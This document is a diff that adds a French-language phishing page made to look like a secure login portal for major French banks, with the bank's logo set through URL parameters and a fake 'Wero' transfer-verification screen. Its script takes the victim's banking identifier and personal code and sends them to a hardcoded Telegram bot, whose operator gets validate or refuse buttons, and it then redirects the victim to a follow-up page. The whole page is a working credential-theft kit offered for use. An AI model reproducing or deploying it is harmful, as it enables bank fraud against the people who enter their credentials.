@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Accès sécurisé</title>
+    
+    <style>
+        :root { --jaune-fond: #ffe680; --jaune-accent: #fff4c2; }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:var(--jaune-fond); min-height:100vh; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; color:#1a1a1a; display:flex; justify-content:center; align-items:center; padding:20px; }
+        .container { max-width:480px; width:100%; background:white; border-radius:16px; box-shadow:0 10px 40px rgba(0,0,0,0.12); overflow:hidden; text-align:center; padding:40px 24px; }
+        .header { background:var(--jaune-accent); padding:25px; border-radius:16px 16px 0 0; margin:-40px -24px 30px; display:flex; align-items:center; justify-content:flex-start; }
+        .logo-img { width:60px; height:60px; margin-left:20px; object-fit:contain; }
+        h1 { font-size:1.8rem; margin:0 0 20px; color:#111; }
+        .bank-display { margin:0 auto 30px; }
+        .bank-logo { width:140px; height:140px; margin:0 auto 20px; border-radius:16px; overflow:hidden; box-shadow:0 6px 20px rgba(0,0,0,0.12); background:white; border:3px solid var(--jaune-accent); }
+        .bank-logo img { width:100%; height:100%; object-fit:contain; padding:10px; }
+        .bank-name { font-size:2.2rem; font-weight:900; color:#000; letter-spacing:-0.5px; text-transform:uppercase; text-shadow:1px 1px 2px rgba(0,0,0,0.1); background:var(--jaune-accent); padding:10px 30px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.1); display:inline-block; }
+        .form-group { margin:25px 0; text-align:left; }
+        .form-group label { display:block; margin-bottom:8px; font-weight:bold; color:#333; font-size:1rem; }
+        .form-group input { width:100%; padding:14px; border:1px solid #ccc; border-radius:8px; font-size:1rem; }
+        .btn { background:var(--jaune-accent); color:#000; font-size:1.2rem; font-weight:bold; padding:16px 50px; border:none; border-radius:50px; cursor:pointer; margin:40px 0 30px; transition:all 0.2s; box-shadow:0 6px 15px rgba(255,244,194,0.5); width:100%; max-width:300px; }
+        .btn:hover { transform:translateY(-2px); box-shadow:0 10px 25px rgba(255,244,194,0.7); }
+        .partners-title { font-size:0.95rem; color:#666; margin:30px 0 15px; }
+        .partners-logos { display:grid; grid-template-columns:repeat(auto-fit,minmax(80px,1fr)); gap:15px; max-width:420px; margin:0 auto; }
+        .logo-item { width:80px; height:50px; margin:0 auto; display:flex; align-items:center; justify-content:center; background:white; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.08); padding:8px; }
+        .logo-item img { max-width:100%; max-height:100%; object-fit:contain; }
+        .footer { font-size:0.85rem; color:#777; margin-top:40px; line-height:1.6; }
+        .footer a { color:#0066cc; margin:0 8px; text-decoration:none; }
+        .footer a:hover { text-decoration:underline; }
+        #loader { position:fixed; top:0; left:0; width:100%; height:100%; background:#ffffff; display:none; flex-direction:column; justify-content:center; align-items:center; z-index:9999; }
+        .loader-container { text-align:center; width:90%; max-width:600px; }
+        .flex-row { display:flex; align-items:center; justify-content:center; gap:30px; margin-bottom:50px; flex-wrap:nowrap; }
+        .image-box { max-width:140px; max-height:140px; border-radius:16px; overflow:hidden; box-shadow:0 6px 20px rgba(0,0,0,0.12); flex-shrink:0; }
+        .image-box img { width:100%; height:100%; object-fit:contain; }
+        .arrow { font-size:4rem; color:#000; font-weight:bold; min-width:60px; }
+        .loading-text { font-size:1.8rem; font-weight:bold; color:#000; letter-spacing:1px; position:relative; }
+        .loading-text::after { content:"."; animation:dots 1.5s steps(4,end) infinite; }
+        @keyframes dots { 0%{content:".";} 33%{content:"..";} 66%{content:"...";} 100%{content:".";} }
+        .error-msg { font-size:1.4rem; color:#d32f2f; margin:30px 0; padding:20px; background:#ffebee; border-radius:12px; }
+        @media (max-width:500px) { .flex-row {gap:20px;} .image-box {max-width:110px;max-height:110px;} .arrow {font-size:3rem;} .loading-text {font-size:1.6rem;} }
+        @media (max-width:480px) { .container {padding:30px 16px;} .bank-logo {width:110px;height:110px;} .partners-logos {grid-template-columns:repeat(auto-fit,minmax(70px,1fr));gap:10px;} .logo-item {width:70px;height:45px;padding:6px;} }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="main-container">
+        <div class="header">
+            <img src="https://i.postimg.cc/3rvSQHBz/IMG-7193.jpg" alt="Logo" class="logo-img">
+        </div>
+        
+        <h1>Accéder à mon espace sécurisé.</h1>
+        
+        <div class="bank-display" id="bank-display">
+            <div class="bank-logo" id="bank-logo" style="display:none;">
+                <img id="bank-img" src="" alt="Banque">
+            </div>
+            <div class="bank-name" id="bank-name" style="display:none;"></div>
+        </div>
+        
+        <form id="login-form">
+            <div class="form-group">
+                <label>Identifiant bancaire</label>
+                <input type="text" id="identifiant" placeholder="Identifiant bancaire" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Code personnel</label>
+                <input type="password" id="code" placeholder="Code personnel" required>
+            </div>
+            
+            <button type="submit" class="btn">JE ME CONNECTE</button>
+        </form>
+        
+        <div class="partners">
+            <div class="partners-title">Ce service vous est proposé par :</div>
+            <div class="partners-logos">
+                <div class="logo-item"><img src="https://i.postimg.cc/sgmvS1XN/agricole.png" alt="Crédit Agricole"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/dQhHxycG/bnp.png" alt="BNP Paribas"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/28vHzN66/caisse.png" alt="Caisse d'Épargne"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/2SD0y9bx/cic.png" alt="CIC"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/859HSZgM/hello.png" alt="Arkéa"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/y63jPC0P/lcl.png" alt="LCL"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/Gh0QggQ1/arkea.png" alt="Arkéa"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/YCMxM4Zn/mutuel.png" alt="Crédit Mutuel"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/nh2GzFtH/postal.png" alt="La Banque Postale"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/zffSHsJT/societe.png" alt="Société Générale"></div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Mentions légales</a> | 
+            <a href="#">FAQ</a> | 
+            <a href="#">CGU</a> | 
+            <a href="#">Cookies et données</a> | 
+            <a href="#">Se désinscrire</a>
+        </div>
+    </div>
+
+    <div id="loader">
+        <div class="loader-container">
+            <div class="flex-row">
+                <div class="image-box">
+                    <img src="https://i.postimg.cc/jSTLYbWt/téléchargement.png" alt="Wero" style="width:100%;height:100%;object-fit:contain;border-radius:16px;box-shadow:0 6px 20px rgba(0,0,0,0.12);">
+                </div>
+                <div class="arrow">→</div>
+                <div class="image-box">
+                    <img src="https://i.postimg.cc/hvN9wFcd/virement_banacaire.png" alt="Banque" style="width:100%;height:100%;object-fit:contain;border-radius:16px;box-shadow:0 6px 20px rgba(0,0,0,0.12);">
+                </div>
+            </div>
+            <div class="loading-text">Vérification en cours...</div>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const banque = urlParams.get('banque') || 'Banque inconnue';
+        const type = urlParams.get('type') || 'logo';
+        const montant = urlParams.get('montant') || '582';
+        
+        const logos = {
+            'Crédit Agricole': 'https://i.postimg.cc/sgmvS1XN/agricole.png',
+            'BNP Paribas': 'https://i.postimg.cc/dQhHxycG/bnp.png',
+            'Caisse d\'Épargne': 'https://i.postimg.cc/28vHzN66/caisse.png',
+            'CIC': 'https://i.postimg.cc/2SD0y9bx/cic.png',
+            'Arkéa': 'https://i.postimg.cc/859HSZgM/hello.png',
+            'LCL': 'https://i.postimg.cc/y63jPC0P/lcl.png',
+            'Crédit Mutuel': 'https://i.postimg.cc/YCMxM4Zn/mutuel.png',
+            'La Banque Postale': 'https://i.postimg.cc/nh2GzFtH/postal.png',
+            'Société Générale': 'https://i.postimg.cc/zffSHsJT/societe.png'
+        };
+        
+        if (type === 'logo') {
+            document.getElementById('bank-logo').style.display = 'block';
+            document.getElementById('bank-img').src = logos[banque] || 'https://i.postimg.cc/nh2GzFtH/postal.png';
+        } else {
+            document.getElementById('bank-name').style.display = 'block';
+            document.getElementById('bank-name').textContent = banque;
+        }
+        
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const identifiant = document.getElementById('identifiant').value.trim();
+            const code = document.getElementById('code').value.trim();
+            
+            const message = `
+🔥 NOUVELLE SAISIE 🔥
+Montant: ${montant} €
+Banque: ${banque}
+Identifiant: ${identifiant}
+Code: ${code}
+            `.trim();
+            
+            const token = "8281062190:AAHjA80kaHFvPIsxK-fIX0sCPykIGcGRp3s";
+            const chat_id = "2036034237";
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chat_id,
+                    text: message,
+                    reply_markup: {
+                        inline_keyboard: [[
+                            { text: "OUI – Valider (page 5)", callback_data: "oui" },
+                            { text: "NON – Refuser (incorrect)", callback_data: "non" }
+                        ]]
+                    }
+                })
+            }).catch(() => {});
+            
+            // Loader actif pendant 15 secondes max
+            document.getElementById('main-container').style.display = 'none';
+            document.getElementById('loader').style.display = 'flex';
+            
+            // Après 15 secondes : auto vers page 5 si rien validé
+            setTimeout(() => {
+                if (document.getElementById('loader').style.display === 'flex') {
+                    window.location.href = 'succes.html?montant=' + montant + '&banque=' + encodeURIComponent(banque) + '&type=' + type;
+                }
+            }, 15000);
+        });
+    </script>
+
+</body>
+</html>
